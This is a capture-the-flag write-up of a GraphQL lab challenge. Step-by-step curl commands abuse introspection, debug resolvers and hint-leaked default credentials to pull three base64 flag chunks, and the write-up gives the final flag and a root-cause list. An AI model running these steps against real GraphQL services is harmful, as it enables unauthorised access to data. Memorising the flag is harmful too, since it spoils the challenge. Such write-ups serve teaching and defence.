# GraphQL Abyss: The Fragmented Cipher

## Challenge

- Name: `GraphQL Abyss: The Fragmented Cipher`
- URL: `http://chall-bc9caff2.evt-316.labs.ctf7.com/`
- Final flag: `Kaal{gr@p#ql_s3cr3t_v@ult_m@st3r_2026}`

## Summary

This was a GraphQL web challenge with introspection enabled, debug resolvers exposed, and weak credentials disclosed through a hint endpoint. The flag was split into three Base64-encoded chunks:

1. Chunk 1 from an unauthenticated debug resolver
2. Chunk 2 from an authenticated internal resolver
3. Chunk 3 from an admin-only schema export / directives dump

After decoding the three chunks and concatenating them in order, the final flag was accepted by the `submitFinalFlag` mutation.

## Recon

Initial request to `/` showed an Apollo GraphQL endpoint protected by CSRF on GET:

```bash
curl -i -sS http://chall-bc9caff2.evt-316.labs.ctf7.com/
```

Using JSON POST worked:

```bash
curl -sS http://chall-bc9caff2.evt-316.labs.ctf7.com/graphql \
  -H 'Content-Type: application/json' \
  --data '{"query":"{ __typename }"}'
```

Schema introspection exposed the useful query and mutation fields:

```graphql
debugSecret
internalSecrets
_exportSchema
_directives
getHint
getProgress
login
submitFinalFlag
```

`getProgress` effectively documented the challenge flow:

- Step 1: `debugSecret(id: "2")`
- Step 2: `internalSecrets`
- Step 3: `_exportSchema` or `_directives`

`getHint(hintNumber: 3)` also leaked valid credentials:

- User: `john_doe / password123`
- Admin: `admin / admin123`

## Exploitation

### 1. Chunk 1 via unauthenticated debug resolver

```bash
curl -sS http://chall-bc9caff2.evt-316.labs.ctf7.com/graphql \
  -H 'Content-Type: application/json' \
  --data '{"query":"{ debugSecret(id:\"2\") { id title flag } }"}'
```

Returned:

```text
Encoded: S2FhbHtnckBwI3FsXw==
```

### 2. Chunk 2 via authenticated internal resolver

Login as normal user:

```bash
curl -sS http://chall-bc9caff2.evt-316.labs.ctf7.com/graphql \
  -H 'Content-Type: application/json' \
  --data '{"query":"mutation { login(username:\"john_doe\", password:\"password123\") }"}'
```

Use the JWT as a Bearer token:

```bash
curl -sS http://chall-bc9caff2.evt-316.labs.ctf7.com/graphql \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer <USER_JWT>' \
  --data '{"query":"{ internalSecrets { id title flag } }"}'
```

Returned:

```text
Encoded: czNjcjN0X3ZAdWx0Xw==
```

### 3. Chunk 3 via admin-only schema export

Login as admin:

```bash
curl -sS http://chall-bc9caff2.evt-316.labs.ctf7.com/graphql \
  -H 'Content-Type: application/json' \
  --data '{"query":"mutation { login(username:\"admin\", password:\"admin123\") }"}'
```

Then query the schema export:

```bash
curl -sS http://chall-bc9caff2.evt-316.labs.ctf7.com/graphql \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer <ADMIN_JWT>' \
  --data '{"query":"{ _exportSchema }"}'
```

The chunk was embedded in a directive argument:

```text
flagChunk3: String = "bUBzdDNyXzIwMjZ9"
```

`_directives` also revealed the same chunk.

## Decode

```bash
printf '%s' 'S2FhbHtnckBwI3FsXw==' | base64 -d
printf '%s' 'czNjcjN0X3ZAdWx0Xw==' | base64 -d
printf '%s' 'bUBzdDNyXzIwMjZ9' | base64 -d
```

Decoded values:

```text
Kaal{gr@p#ql_
s3cr3t_v@ult_
m@st3r_2026}
```

Combined flag:

```text
Kaal{gr@p#ql_s3cr3t_v@ult_m@st3r_2026}
```

## Validation

```bash
curl -sS http://chall-bc9caff2.evt-316.labs.ctf7.com/graphql \
  -H 'Content-Type: application/json' \
  --data '{"query":"mutation { submitFinalFlag(flag:\"Kaal{gr@p#ql_s3cr3t_v@ult_m@st3r_2026}\", teamName:\"ctf-orc\") }"}'
```

Server response confirmed the flag was accepted.

## Root Cause

- GraphQL introspection left enabled in production
- Debug/internal resolvers exposed to users
- Hint endpoint leaked valid credentials
- Admin-only secret embedded in directive arguments returned by debug schema export
